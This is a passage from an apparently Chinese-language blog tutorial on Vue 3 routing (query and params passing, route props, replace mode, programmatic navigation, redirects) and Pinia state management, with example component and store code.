Randolfluo&lt;/h2&gt;</span><br><span class="line">   &lt;ul&gt;</span><br><span class="line">        &lt;li v-for = &quot;texts in textlist&quot; :key=&quot;texts.id&quot;&gt;</span><br><span class="line">            &lt;RouterLink </span><br><span class="line">            :to=&quot;&#123;</span><br><span class="line">               name: &#x27;detailname&#x27;,            //query</span><br><span class="line">               query:&#123;</span><br><span class="line">                  id:texts.id,</span><br><span class="line">                  title:texts.title,</span><br><span class="line">                  content:texts.content</span><br><span class="line">               &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;&quot;</span><br><span class="line">            &gt;</span><br><span class="line">            &#123;&#123;texts.title&#125;&#125;</span><br><span class="line">         &lt;/RouterLink&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">   &lt;/ul&gt;</span><br><span class="line">      &lt;router-view&gt;&lt;/router-view&gt;      </span><br><span class="line">      &lt;!-- 子组件展示区 --&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang = ts setup name = &quot;about&quot;&gt;</span><br><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;;</span><br><span class="line">import &#123; RouterView, RouterLink &#125; from &#x27;vue-router&#x27;;</span><br><span class="line">const textlist = reactive([</span><br><span class="line">    &#123;</span><br><span class="line">        id: &#x27;ads1&#x27;, title: &#x27;如何变帅&#x27;, content: &#x27;变帅的方法&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: &#x27;ads2&#x27;, title: &#x27;我的博客&#x27;, content: &#x27;Randolfluo.top&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: &#x27;ads3&#x27;, title: &#x27;初音未来P主&#x27;, content: &#x27;匹老板、火锅P、春卷饭！&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">])</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在子路由显示数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;ul class=&quot;textlist&quot;&gt;</span><br><span class="line">        &lt;li&gt;编号：&#123;&#123; query.id &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;标题：&#123;&#123; query.title &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容: &#123;&#123; query.content &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;detail&quot;&gt;</span><br><span class="line">import &#123; toRefs &#125; from &#x27;vue&#x27;;</span><br><span class="line">import &#123; useRoute &#125; from &#x27;vue-router&#x27;;</span><br><span class="line"></span><br><span class="line">let route = useRoute();</span><br><span class="line">let &#123; query &#125; = toRefs(route);          //转为响应式</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="params"><a href="#params" class="headerlink" title="_params"></a>_params</h4><blockquote><p>备注1：传递<code>params</code>参数时，若使用<code>to</code>的对象写法，必须使用<code>name</code>配置项，不能用<code>path</code>。</p><p>备注2：传递<code>params</code>参数时，需要提前在规则中占位。</p></blockquote><h4 id="路由的props配置"><a href="#路由的props配置" class="headerlink" title="路由的props配置"></a>路由的props配置</h4><p>添加props</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),    <span class="comment">//在不刷新页面的情况下改变URL，同时保持应用的SPA（单页应用）特性。</span></span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: about,</span><br><span class="line">      <span class="attr">children</span>: [          <span class="comment">//添加子路由</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&#x27;detailname&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>: detail,</span><br><span class="line">          <span class="comment">// props的对象写法，作用：把对象中的每一组key-value作为props传给Detail组件</span></span><br><span class="line">          <span class="comment">// props:&#123;a:1,b:2,c:3&#125;, </span></span><br><span class="line"></span><br><span class="line">          <span class="comment">// props的布尔值写法，作用：把收到了每一组params参数，作为props传给Detail组件</span></span><br><span class="line">          <span class="comment">// props:true</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">// props的函数写法，作用：把返回的对象中每一组key-value作为props传给Detail组件</span></span><br><span class="line">          <span class="title function_">props</span>(<span class="params">route</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> route.<span class="property">query</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/context&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;context&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: context,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;ul class=&quot;textlist&quot;&gt;</span><br><span class="line">        &lt;li&gt;编号：&#123;&#123;id &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;标题：&#123;&#123; title &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容: &#123;&#123;content &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;detail&quot;&gt;</span><br><span class="line">defineProps([&#x27;id&#x27;,&#x27;title&#x27;,&#x27;content&#x27;])//使用了defineProps函数来定义组件接收的props</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="replace属性"><a href="#replace属性" class="headerlink" title="_replace属性"></a>_replace属性</h3><ol><li><p>作用：控制路由跳转时操作浏览器历史记录的模式。</p></li><li><p>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>：</p><ul><li><code>push</code>是追加历史记录（默认值）。</li><li><code>replace</code>是替换当前记录。</li></ul></li><li><p>开启<code>replace</code>模式(在每个link添加)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;RouterLink replace .......&gt;News&lt;/RouterLink&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="编程式路由导航"><a href="#编程式路由导航" class="headerlink" title="编程式路由导航"></a>编程式路由导航</h3><p>在script里编写跳转代码</p><ul><li>可以实现三秒浏览后跳转</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script lang = &quot;ts&quot; setup name = &quot;App&quot;&gt;</span><br><span class="line"> import &#123;RouterView&#125; from &#x27;vue-router&#x27;</span><br><span class="line"></span><br><span class="line">import &#123; onMounted &#125; from &#x27;vue&#x27;;</span><br><span class="line">import &#123;useRouter&#125; from &#x27;vue-router&#x27;;</span><br><span class="line">const router = useRouter();</span><br><span class="line">onMounted(() =&gt; &#123; </span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    router.push(&#x27;/about&#x27; );</span><br><span class="line">  &#125;, 3000);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>还可用于在button等组件实现路由跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"> ...</span><br><span class="line">         &lt;li v-for=&quot;texts in textlist&quot; :key=&quot;texts.id&quot;&gt;</span><br><span class="line">            &lt;button @click=&quot;jumptoabout(texts)&quot;&gt;查看文章&lt;/button&gt;&quot;//添加一个</span><br><span class="line">            &lt;RouterLink :to=&quot;&#123;</span><br><span class="line">               name: &#x27;detailname&#x27;,            //query</span><br><span class="line">               query: &#123;</span><br><span class="line">                  id: texts.id,</span><br><span class="line">                  title: texts.title,</span><br><span class="line">                  content: texts.content</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">            &#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=ts setup name=&quot;about&quot;&gt;</span><br><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;;</span><br><span class="line">import &#123; RouterView, RouterLink, useRouter &#125; from &#x27;vue-router&#x27;;</span><br><span class="line">。。。</span><br><span class="line">const router = useRouter();</span><br><span class="line">interface TextInter &#123;//定义接口用于类型检查</span><br><span class="line">   id: string;</span><br><span class="line">   title: string;</span><br><span class="line">   content: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function jumptoabout(texts: TextInter) &#123;</span><br><span class="line">   router.push(&#123;</span><br><span class="line">      name: &#x27;detailname&#x27;,            //query</span><br><span class="line">      query: &#123;</span><br><span class="line">         id: texts.id,</span><br><span class="line">         title: texts.title,</span><br><span class="line">         content: texts.content</span><br><span class="line">      &#125;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="路由重定向"><a href="#路由重定向" class="headerlink" title="路由重定向"></a>路由重定向</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">redirect</span>: <span class="string">&#x27;/about&#x27;</span><span class="comment">//根路径时，会自动重定向到 /about 页面。</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="pinia"><a href="#pinia" class="headerlink" title="pinia"></a>pinia</h3><h4 id="准备一个环境"><a href="#准备一个环境" class="headerlink" title="准备一个环境"></a>准备一个环境</h4><p>可以通过函数生成唯一<code>nanoid</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import &#123;nanoid&#125; from &#x27;nanoid&#x27;</span><br><span class="line"></span><br><span class="line">    async function getLoveTalk()&#123;</span><br><span class="line">      // 发请求，下面这行的写法是：连续解构赋值+重命名</span><br><span class="line">      let &#123;data:&#123;content:title&#125;&#125; = await axios.get(&#x27;https://api.uomg.com/api/rand.qinghua?format=json&#x27;)</span><br><span class="line">      // 把请求回来的字符串，包装成一个对象</span><br><span class="line">      let obj = &#123;id:nanoid(),title&#125;</span><br><span class="line">      // 放到数组中</span><br><span class="line">      talkList.unshift(obj)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i pinia</span><br></pre></td></tr></table></figure><p>在app.vue初始化pinia</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Count/&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;LoveTalk/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;App&quot;&gt;</span><br><span class="line">  import Count from &#x27;./components/Count.vue&#x27;</span><br><span class="line">  import LoveTalk from &#x27;./components/LoveTalk.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="存储-读取数据"><a href="#存储-读取数据" class="headerlink" title="存储+读取数据"></a>存储+读取数据</h4><ol><li><p><code>Store</code>是一个保存：<strong>状态</strong>、<strong>业务逻辑</strong> 的实体，每个组件都可以<strong>读取</strong>、<strong>写入</strong>它。</p></li><li><p>它有三个概念：<code>state</code>、<code>getter</code>、<code>action</code>，相当于组件中的： <code>data</code>、 <code>computed</code> 和 <code>methods</code>。</p></li><li><p>具体编码：<code>src/store/count.ts</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;&#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">sum</span>:<span class="number">6</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>具体编码：<code>src/store/talk.ts</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTalkStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;talk&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;&#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">talkList</span>:[</span><br><span class="line">        &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada01&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;你今天有点怪，哪里怪？怪好看的！&#x27;</span>&#125;,</span><br><span class="line">     &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada02&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;草莓、蓝莓、蔓越莓，你想我了没？&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada03&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;心里给你留了一块地，我的死心塌地&#x27;</span>&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中使用<code>state</code>中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;当前求和为：&#123;&#123; sumStore.sum &#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  // 引入对应的useXxxxxStore</span><br><span class="line">  import &#123;useSumStore&#125; from &#x27;@/store/sum&#x27;</span><br><span class="line">  </span><br><span class="line">  // 调用useXxxxxStore得到对应的store</span><br><span class="line">  const sumStore = useSumStore()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;talk in talkStore.talkList&quot; :key=&quot;talk.id&quot;&gt;</span><br><span class="line">      &#123;&#123; talk.content &#125;&#125;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  import axios from &#x27;axios&#x27;</span><br><span class="line">  import &#123;useTalkStore&#125; from &#x27;@/store/talk&#x27;</span><br><span class="line"></span><br><span class="line">  const talkStore = useTalkStore()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h4 id="修改数据-三种方式"><a href="#修改数据-三种方式" class="headerlink" title="修改数据(三种方式)"></a>修改数据(三种方式)</h4><ol><li><p>第一种修改方式，直接修改</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">countStore.<span class="property">sum</span> = <span class="number">666</span></span><br></pre></td></tr></table></figure></li><li><p>第二种修改方式：批量修改</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">countStore.$patch(&#123;</span><br><span class="line">  <span class="attr">sum</span>:<span class="number">999</span>,</span><br><span class="line">  <span class="attr">school</span>:<span class="string">&#x27;atguigu&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>第三种修改方式：借助<code>action</code>修改（<code>action</code>中可以编写一些业务逻辑）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>, &#123;</span><br><span class="line">  <span class="comment">/*************/</span></span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="comment">//加</span></span><br><span class="line">    <span class="title function_">increment</span>(<span class="params">value:number</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">sum</span> &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="comment">//操作countStore中的sum</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sum</span> += value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//减</span></span><br><span class="line">    <span class="title function_">decrement</span>(<span class="params">value:number</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">sum</span> &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sum</span> -= value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/*************/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中调用<code>action</code>即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用countStore</span></span><br><span class="line"><span class="keyword">const</span> countStore = <span class="title function_">useCountStore</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用对应action</span></span><br><span class="line">countStore.<span class="title function_">incrementOdd</span>(n.<span class="property">value</span>)</span><br></pre></td></tr></table></figure></li></ol><h4 id="storeToRefs"><a href="#storeToRefs" class="headerlink" title="storeToRefs"></a>storeToRefs</h4><ul><li>借助<code>storeToRefs</code>将<code>store</code>中的数据转为<code>ref</code>对象，方便在模板中使用。</li><li>注意：<code>pinia</code>提供的<code>storeToRefs</code>只会将数据做转换，而<code>Vue</code>的<code>toRefs</code>会转换<code>store</code>中数据。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;count&quot;&gt;</span><br><span class="line">&lt;h2&gt;当前求和为：&#123;&#123;sum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  import &#123; useCountStore &#125; from &#x27;@/store/count&#x27;</span><br><span class="line">  /* 引入storeToRefs */</span><br><span class="line">  import &#123; storeToRefs &#125; from &#x27;pinia&#x27;</span><br><span class="line"></span><br><span class="line">/* 得到countStore */</span><br><span class="line">  const countStore = useCountStore()</span><br><span class="line">  /* 使用storeToRefs转换countStore，随后解构 */</span><br><span class="line">  const &#123;sum&#125; = storeToRefs(countStore)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="getters"><a href="#getters" class="headerlink" title="getters"></a>getters</h4><ol><li><p>概念：当<code>state</code>中的数据，需要经过处理后再使用时，可以使用<code>getters</code>配置。</p></li><li><p>追加<code>getters</code>配置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;</span><br><span class="line">    <span class="comment">/************/</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">sum</span>:<span class="number">1</span>,</span><br><span class="line">      <span class="attr">school</span>:<span class="string">&#x27;atguigu&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;</span><br><span class="line">    <span class="attr">bigSum</span>:(state):<span class="function"><span class="params">number</span> =&gt;</span> state.<span class="property">sum</span> *<span class="number">10</span>,</span><br><span class="line">    <span class="title function_">upperSchool</span>():string&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>. school.<span class="title function_">toUpperCase</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中读取数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;increment,decrement&#125; = countStore</span><br><span class="line"><span class="keyword">let</span> &#123;sum,school,bigSum,upperSchool&#125; = <span class="title function_">storeToRefs</span>(countStore)</span><br></pre></td></tr></table></figure></li></ol><h4 id="subscribe"><a href="#subscribe" class="headerlink" title="$subscribe"></a>$subscribe</h4><p>通过 store 的 <code>$subscribe()</code> 方法侦听 <code>state</code> 